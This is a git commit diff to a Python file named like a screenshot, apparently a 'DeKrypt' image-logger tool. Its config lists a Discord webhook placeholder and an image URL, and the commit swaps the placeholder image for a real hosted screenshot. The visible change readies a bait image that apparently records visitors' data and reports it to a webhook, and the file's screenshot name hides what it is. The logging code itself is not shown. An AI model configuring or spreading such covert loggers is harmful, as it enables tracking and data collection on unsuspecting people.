b282c2b451ae525ccf3f428876cb247ece01a142
FuryNocturne20 <120116637+FuryNocturne20@users.noreply.github.com>
2023-04-24 13:21:57 +0200

    Update Capture-d'écran-2023-04-24-010740.py

--- api/Capture-d'écran-2023-04-24-010740.py
+++ api/Capture-d'écran-2023-04-24-010740.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://github.com/FuryNocturne20/image/blob/main/Capture%20d'%C3%A9cran%202023-04-24%20010740.png?raw=true", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
